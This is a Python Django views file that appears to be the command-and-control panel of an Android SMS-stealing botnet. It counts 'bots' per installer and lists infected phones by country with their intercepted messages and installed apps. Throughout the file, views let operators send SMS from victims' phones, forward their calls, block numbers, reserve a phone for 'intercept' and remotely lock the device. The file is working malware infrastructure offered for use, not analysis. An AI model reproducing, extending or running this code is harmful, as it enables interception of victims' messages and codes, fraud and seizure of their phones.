import json
import logging
import datetime

from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login as auth_login
from django.contrib.auth.models import User
from django.db.models import Q
from django.http import HttpResponse, HttpResponseServerError
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import logout
from django.utils import timezone
from django.views.decorators.cache import never_cache
from django.views.decorators.debug import sensitive_post_parameters
from django.views.decorators.http import require_http_methods
from django.utils.translation import ugettext_lazy as _

from smsapp import models, commands, sys_messages, cfields


logger = logging.getLogger(__name__)


def home(request):
    if request.user.id:
        if request.user.is_staff:
            return redirect('admin:index')
        # check if user is an installer
        try:
            inst = models.Installer.objects.get(pk=request.user.id)
            now = timezone.now()
            # beginning of the day
            bod = datetime.datetime(year=now.year, month=now.month, day=now.day, hour=0, minute=0, second=0,
                                    tzinfo=timezone.get_current_timezone())
            phonedata_set = models.PhoneData.objects.filter(installer=inst)
            return render(request, "install_stats.html",
                          {
                              'total_bots': phonedata_set.count(),
                              'bots_today': phonedata_set.filter(registered__gte=bod).count(),
                          })
        except models.Installer.DoesNotExist:
            return render(request, "countries.html",
                          {'data': models.PhoneData.objects.get_country_list(request.user.id)})
    return render(request, "index.html")


@login_required()
def logout_local(request):
    logout(request)
    messages.success(request, _("Logged out"))
    return redirect("home")


@login_required()
def inside_country(request, country):
    return render(request, "inside_country.html",
                  {'country': country, 'phones': models.PhoneData.objects.get_active_phones(request.user.id, country)})


@login_required()
def sms_list(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    sms_data = pd.smsrecord_set.filter(source__isnull=False).order_by('-created').all()
    blocked_data = pd.blockednumber_set.all()
    user_comments = None
    if request.user.is_superuser:
        comment = pd.admin_comment if pd.admin_comment else ""
        user_comments = pd.usercomment_set.all()
    else:
        try:
            su = models.SysUser.objects.get(user_ptr=request.user.id)
            comment = models.UserComment.objects.get(phone=pd, user=su)
            comment = comment.contents if comment else ""
        except models.UserComment.DoesNotExist:
            comment = ""

    if request.is_ajax():
        l = []
        for s in reversed(sms_data):
            l.append({'from': s.source, 'id': s.id, 'text': s.contents})
        ctx = {'sms_data': l}
        return HttpResponse(json.dumps(ctx), content_type="application/json")
    ctx = {
        'sms_data': sms_data, 'phone_data': pd, 'blocked_data': blocked_data,
        'app_data': pd.installedapp_set.all(),
        'int_sms_data': pd.internalsms_set.all(),
        'comment': comment,
        'user_comments': user_comments,
    }
    return render(request, "phone_details.html", ctx)


class StateError(Exception):
    pass


def get_boolean_from_request(request, key, method='POST'):
    """ gets the value from request and returns it's boolean state """
    value = getattr(request, method).get(key, False)
    if value == 'False' or value == 'false' or value == '0' or value == 0:
        value = False
    elif value:
        value = True
    else:
        value = False
    return value


@login_required()
@require_http_methods(["POST"])
def send_sms(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    to = request.POST.get("recipient")
    txt = request.POST.get("sms")
    commands.send_sms(pd, to, txt)
    return HttpResponse(json.dumps({'success': "SMS successfully sent to {0}".format(to)}),
                        content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def forward_calls(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    number = request.POST.get('number')
    commands.forward_calls(pd, number)
    return HttpResponse(json.dumps({'success': "Starting call forwarding to {0}".format(number)}),
                        content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def disable_forward_calls(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    commands.disable_forward_calls(pd)
    return HttpResponse(json.dumps({'success': "Disabling call forwarding"}),
                        content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def toggle_phone(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    flag = get_boolean_from_request(request, 'flag')
    try:
        if pd.owner_id is not None and pd.owner_id != request.user.id:
            raise StateError("Another user is already using this phone")
        if flag:
            # release all other owned phones
            for p in models.PhoneData.objects.exclude(id=phone_id).filter(owner_id=request.user.id):
                commands.release_phone(p)
            if pd.owner_id is None:
                user = User.objects.get(pk=request.user.id)
                if not commands.reserve_phone(user, pd):
                    raise StateError("Could not reserve the phone")
                return HttpResponse(
                    json.dumps({'success': "Please wait while intercept starts", 'result': 1}),
                    content_type="application/json")
            elif pd.owner_id == request.user.id:
                sys_messages.add_message(pd.uniq_id, {'imei': pd.imei})  # to switch off the indicator
                return HttpResponse(json.dumps({'warning': "The phone is already in intercept status", 'result': 1}),
                                    content_type="application/json")
        else:
            if pd.owner_id == request.user.id:
                commands.release_phone(pd)
                return HttpResponse(
                    json.dumps({'success': "The phone {0} is going to be released".format(pd), 'result': 0}),
                    content_type="application/json")
        raise StateError("Unknown error")
    except StateError as e:
        logger.error("Error processing phone state request: {0}".format(e))
        return HttpResponseServerError(e)


@login_required()
@require_http_methods(["POST"])
def unblock_number(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    all = request.POST.get('all')
    if all:
        commands.unblock_all(pd)
        return HttpResponse(
            json.dumps({'success': "Sent command to unblock all numbers"}),
            content_type="application/json")
    else:
        number = request.POST.get('number')
        commands.unblock_phone(pd, number)
        return HttpResponse(
            json.dumps({'success': "Sent command to unblock number {0}".format(number)}),
            content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def block_number(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    number = request.POST.get('number')
    commands.block_phone(pd, number)
    return HttpResponse(
        json.dumps({'success': "Sent command to block number {0}".format(number)}),
        content_type="application/json")


@login_required()
def history(request):
    phone_list = models.SMSRecord.objects.filter(owner_id=request.user.id).select_related('phone').order_by(
        'phone').distinct('phone')
    return render(request, "history.html", {'phones': phone_list})


@login_required()
def clear_messages(request, phone_id):
    pd = get_object_or_404(models.PhoneData, Q(pk=phone_id) & Q(owner__id=request.user.id))
    messages.success(request, "Messages cleared {0}".format(pd))
    models.SMSRecord.objects.filter(phone=pd).all().delete()
    return redirect('history')


@login_required()
@require_http_methods(["POST"])
def get_messages(request, phone_id):
    phone = get_object_or_404(models.PhoneData, pk=phone_id)
    commands.touch_phone(phone.uniq_id)
    msg_list = []
    while True:
        m = sys_messages.retrieve_next_message(phone.uniq_id)
        if m is None:
            break
        msg_list.append(m)
    resp = {'messages': msg_list} if len(msg_list) else {}
    return HttpResponse(json.dumps(resp), content_type="application/json")


@sensitive_post_parameters()
@require_http_methods(["POST"])
@never_cache
def login(request):
    form = AuthenticationForm(request, data=request.POST)
    if form.is_valid():
        auth_login(request, form.get_user())
        messages.success(request, "Logged in")
        return redirect('home')
    messages.error(request, "Login failed")
    return redirect('home')


@login_required()
@require_http_methods(["POST"])
def get_country_operators(request):
    ccode = request.POST.get("ccode")
    lst = cfields.get_operator_choices(ccode)
    res = {'success': True, 'choices': lst}
    return HttpResponse(json.dumps(res), content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def save_comment(request, phone_id):
    phone = get_object_or_404(models.PhoneData, pk=phone_id)
    contents = request.POST.get("contents")
    if request.user.is_superuser:
        phone.admin_comment = contents
        phone.save()
    else:
        user = get_object_or_404(models.SysUser, user_ptr=request.user.id)
        c, created = models.UserComment.objects.get_or_create(user=user, phone=phone)
        c.contents = contents
        c.save()
    resp = {'success': True}
    return HttpResponse(json.dumps(resp), content_type="application/json")


@login_required()
@require_http_methods(["POST"])
def lock_phone(request, phone_id):
    pd = get_object_or_404(models.PhoneData, pk=phone_id)
    flag = get_boolean_from_request(request, 'flag')
    try:
        if pd.owner_id is not None and pd.owner_id != request.user.id:
            raise StateError("Another user is already using this phone")
        if flag:
            if pd.locked:
                raise StateError("The phone is already in locked status")
            commands.device_lock(pd, True)
            return HttpResponse(
                json.dumps({'success': "The phone {0} is going to be locked".format(pd), 'result': 0}),
                content_type="application/json")
        else:
            if not pd.locked:
                raise StateError("The phone is not locked")
            commands.device_lock(pd, False)
            return HttpResponse(
                json.dumps({'success': "The phone {0} is going to be unlocked".format(pd), 'result': 0}),
                content_type="application/json")
    except StateError as e:
        logger.error("Error processing phone state request: {0}".format(e))
        return HttpResponseServerError(e)
